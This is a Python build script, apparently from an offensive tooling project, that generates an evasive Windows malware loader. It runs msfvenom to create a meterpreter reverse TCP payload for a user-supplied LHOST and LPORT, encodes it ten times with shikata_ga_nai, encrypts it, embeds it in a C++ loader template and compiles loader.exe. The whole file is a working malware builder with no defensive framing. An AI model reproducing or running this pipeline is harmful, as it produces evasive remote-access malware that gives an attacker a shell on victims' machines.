from insert_code import insert_payload
from encrypt import encrypt
from compiler import compile_code

import subprocess as sb

try:
    LHOST = input('LHOST = ')
    LPORT = int(input('LPORT = '))
except Exception as e:
    print(e)
    print('Input error')
    exit(-1)

RAW_CODE_FILE = 'reverse_tcp_raw.bin'

ENCRYPTED_CODE_FILE = 'reverse_tcp_enc.bin'

KEY = 'x'

LOADER_TEMPLATE = 'payload_deployer.template'

GEN_CODE = 'payload_deployer_gen.cpp'

LOADER_EXE = 'loader.exe'


print('Creating payload using msfvenom...')

payload_creator = sb.Popen(["msfvenom",
                            "-p", "windows/x64/meterpreter_reverse_tcp",
                            "-e", "x86/shikata_ga_nai",
                            "-i", "10",
                            f'LHOST={LHOST}',
                            f'LPORT={LPORT}',
                            "-f", "raw",
                            "-o", RAW_CODE_FILE])

if payload_creator.wait() != 0:
    print('Error creating MSF payload')
    exit(-1)

print('Encrypting payload...')

encrypt(RAW_CODE_FILE, ENCRYPTED_CODE_FILE, KEY)

print('Inserting payload into loader...')

insert_payload(ENCRYPTED_CODE_FILE, KEY, LOADER_TEMPLATE, GEN_CODE)

print('Compiling generated code...')

if not compile_code(GEN_CODE, LOADER_EXE):
    print('Error compiling generated code!')
    exit(-1)

print('Loader generated at', LOADER_EXE)
